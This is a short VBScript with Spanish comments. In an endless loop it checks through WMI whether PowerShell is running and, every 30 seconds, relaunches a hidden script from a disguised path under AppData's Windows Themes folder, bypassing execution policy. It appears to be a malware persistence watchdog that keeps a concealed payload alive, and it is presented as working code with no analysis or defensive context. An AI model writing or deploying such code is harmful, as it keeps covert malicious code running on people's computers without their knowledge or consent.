Dim objShell, objWMIService, colProcesses, objProcess
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")

Do
    ' Obtener la lista de procesos
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")

    ' Verificar si PowerShell está en ejecución
    If colProcesses.Count = 0 Then
        ' Si no está en ejecución, volver a lanzarlo
        objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
    End If

    ' Esperar 30 segundos antes de la próxima verificación
    WScript.Sleep 30000
Loop
